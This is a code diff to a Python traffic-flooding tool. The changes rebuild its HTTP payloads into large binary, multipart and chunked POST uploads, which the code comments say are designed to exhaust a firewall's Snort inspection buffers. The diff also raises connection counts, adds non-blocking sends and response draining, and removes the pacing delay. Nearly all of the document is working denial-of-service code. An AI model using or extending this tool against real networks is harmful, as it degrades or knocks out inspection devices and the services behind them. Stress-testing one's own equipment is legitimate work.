@@ -85,9 +85,11 @@ PROTOCOL_REGISTRY = {
     "cifs":    ("tcp",  445,  "CifsMutator"),
     "telnet":  ("tcp",  23,   "TelnetMutator"),
     "icmp":    ("icmp", 0,    "IcmpMutator"),
-    "http_clean":  ("tcp_vol", 80,  None),
-    "rtsp_clean":  ("tcp_vol", 554, None),
-    "ftp_clean":   ("tcp_vol", 21,  None),
+    "http_clean":   ("tcp_vol", 80,  None),
+    "http_clean2":  ("tcp_vol", 80,  None),
+    "http_clean3":  ("tcp_vol", 80,  None),
+    "rtsp_clean":   ("tcp_vol", 554, None),
+    "ftp_clean":    ("tcp_vol", 21,  None),
 }
 
 
@@ -386,41 +388,86 @@ def tcp_persistent_worker(proto, target, port, mutator, dns_classes):
 # -- Clean payload generators (well-formed, pass LINA inspection) -------------
 
 def build_clean_http_pool(target):
-    """Generate pool of valid, pipelined HTTP requests that LINA passes through."""
-    methods = ["GET", "HEAD", "OPTIONS", "POST"]
+    """Generate pool of heavyweight HTTP payloads designed to pressure Snort.
+
+    Strategy: large POST uploads with binary/multipart bodies force Snort's
+    file inspection engine to hold 1550-byte blocks while reassembling.
+    Chunked transfer encoding creates extra reassembly work. Each pool entry
+    is 16-48 KB — a single sendall() maps to 10-30 LINA packet buffers."""
     paths = [
-        "/", "/index.html", "/api/v1/status", "/images/logo.png",
-        "/css/style.css", "/js/app.js", "/favicon.ico", "/robots.txt",
-        "/about", "/contact", "/login", "/health", "/sitemap.xml",
-        "/assets/fonts/main.woff2", "/api/v2/users", "/docs/readme",
+        "/upload", "/api/v1/import", "/files/submit", "/data/ingest",
+        "/api/v2/batch", "/webhook/receive", "/rpc/process",
+        "/graphql", "/api/files/analyze", "/submit/report",
     ]
     agents = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
         "curl/8.4.0", "python-requests/2.31.0",
     ]
+    content_types = [
+        "application/octet-stream",
+        "application/pdf",
+        "application/zip",
+        "image/png",
+        "application/x-executable",
+        "multipart/form-data; boundary=----FormBoundary7MA4YWxkTrZu0gW",
+    ]
     pool = []
     for _ in range(PAYLOAD_POOL_SIZE):
-        n_reqs = random.randint(10, 20)
         buf = b""
+        n_reqs = random.randint(3, 6)
         for _ in range(n_reqs):
-            method = random.choice(methods)
             path = random.choice(paths)
             agent = random.choice(agents)
-            req = (
-                f"{method} {path} HTTP/1.1\r\n"
-                f"Host: {target}\r\n"
-                f"User-Agent: {agent}\r\n"
-                f"Accept: */*\r\n"
-                f"Connection: keep-alive\r\n"
-            )
-            if method == "POST":
-                body = os.urandom(random.randint(16, 128)).hex()
-                req += f"Content-Type: application/x-www-form-urlencoded\r\n"
-                req += f"Content-Length: {len(body)}\r\n\r\n{body}"
+            ct = random.choice(content_types)
+
+            use_chunked = random.random() < 0.4
+            body_size = random.randint(4096, 12288)
+            body = os.urandom(body_size)
+
+            if "multipart" in ct:
+                boundary = "----FormBoundary7MA4YWxkTrZu0gW"
+                mp_body = (
+                    f"--{boundary}\r\n"
+                    f"Content-Disposition: form-data; name=\"file\"; "
+                    f"filename=\"data_{random.randint(1000,9999)}.bin\"\r\n"
+                    f"Content-Type: application/octet-stream\r\n\r\n"
+                ).encode() + body + f"\r\n--{boundary}--\r\n".encode()
+                req = (
+                    f"POST {path} HTTP/1.1\r\n"
+                    f"Host: {target}\r\n"
+                    f"User-Agent: {agent}\r\n"
+                    f"Content-Type: {ct}\r\n"
+                    f"Content-Length: {len(mp_body)}\r\n"
+                    f"Connection: keep-alive\r\n\r\n"
+                ).encode() + mp_body
+            elif use_chunked:
+                chunks = b""
+                offset = 0
+                while offset < len(body):
+                    chunk_sz = random.randint(512, 2048)
+                    chunk = body[offset:offset + chunk_sz]
+                    chunks += f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n"
+                    offset += chunk_sz
+                chunks += b"0\r\n\r\n"
+                req = (
+                    f"POST {path} HTTP/1.1\r\n"
+                    f"Host: {target}\r\n"
+                    f"User-Agent: {agent}\r\n"
+                    f"Content-Type: {ct}\r\n"
+                    f"Transfer-Encoding: chunked\r\n"
+                    f"Connection: keep-alive\r\n\r\n"
+                ).encode() + chunks
             else:
-                req += "\r\n"
-            buf += req.encode()
+                req = (
+                    f"POST {path} HTTP/1.1\r\n"
+                    f"Host: {target}\r\n"
+                    f"User-Agent: {agent}\r\n"
+                    f"Content-Type: {ct}\r\n"
+                    f"Content-Length: {len(body)}\r\n"
+                    f"Connection: keep-alive\r\n\r\n"
+                ).encode() + body
+            buf += req
         pool.append(buf)
     return pool
 
@@ -493,12 +540,18 @@ def build_clean_ftp_pool(target):
 
 
 # -- TCP Volume Worker (well-formed, no split, max throughput) ----------------
-_TCP_VOL_POOL = 30
+_TCP_VOL_POOL = 60
 
 def tcp_volume_worker(proto, target, port, _mutator, _dns_classes):
-    """High-throughput TCP worker that sends complete, well-formed payloads.
-    No split-segment logic — every sendall() delivers full protocol messages
-    so LINA classifies and forwards to Snort without dropping."""
+    """High-throughput TCP worker that sends large, well-formed payloads.
+
+    Key differences from tcp_persistent_worker:
+    - No split-segment logic — full payloads via sendall()
+    - Non-blocking recv drains server responses to prevent TCP window stalls
+    - Large payloads (16-48 KB) with binary bodies force Snort to hold
+      1550-byte blocks during file/stream reassembly inspection
+    - 60 connections per thread for higher concurrency"""
+
     if "http" in proto:
         pool = build_clean_http_pool(target)
     elif "rtsp" in proto:
@@ -522,11 +575,12 @@ def tcp_volume_worker(proto, target, port, _mutator, _dns_classes):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                          struct.pack('ii', 1, 0))
             s.settimeout(TCP_CONNECT_TIMEOUT)
             s.connect((target, port))
-            s.settimeout(TCP_SEND_TIMEOUT)
+            s.setblocking(False)
             sock_pool[slot] = s
             return s
         except OSError:
@@ -541,6 +595,18 @@ def tcp_volume_worker(proto, target, port, _mutator, _dns_classes):
                 s.close()
             except Exception:
                 pass
+
+    def _drain(s):
+        """Non-blocking drain of server responses to keep TCP window open."""
+        try:
+            while True:
+                data = s.recv(16384)
+                if not data:
+                    return False
+        except BlockingIOError:
+            return True
+        except OSError:
+            return False
 
     def _flush():
         nonlocal local_pkts, local_bytes, local_errs
@@ -566,20 +632,34 @@ def tcp_volume_worker(proto, target, port, _mutator, _dns_classes):
                     _flush()
                 continue
 
+        if not _drain(s):
+            _close(slot)
+            s = _open(slot)
+            if s is None:
+                local_errs += 1
+                if local_errs >= BATCH_SIZE:
+                    _flush()
+                continue
+
         payload = pool[idx % len(pool)]
         idx += 1
 
         try:
-            s.sendall(payload)
+            total_sent = 0
+            while total_sent < len(payload):
+                try:
+                    sent = s.send(payload[total_sent:])
+                    if sent == 0:
+                        raise OSError("send returned 0")
+                    total_sent += sent
+                except BlockingIOError:
+                    _drain(s)
+                    continue
             local_pkts += 1
-            local_bytes += len(payload)
+            local_bytes += total_sent
         except OSError:
             _close(slot)
             local_errs += 1
-
-        delay = current_phase.get("send_delay", 0)
-        if delay > 0:
-            time.sleep(delay)
 
         if local_pkts >= BATCH_SIZE:
             _flush()
@@ -1205,7 +1285,7 @@ def main():
 
     if args.flood:
         if args.clean_flood:
-            pf = {"http_clean", "rtsp_clean", "ftp_clean"}
+            pf = {"http_clean", "http_clean2", "http_clean3"}
         else:
             pf = set(args.protocols.split(",")) if args.protocols else None
         run_flood(args.target, args.duration, args.phase_duration,
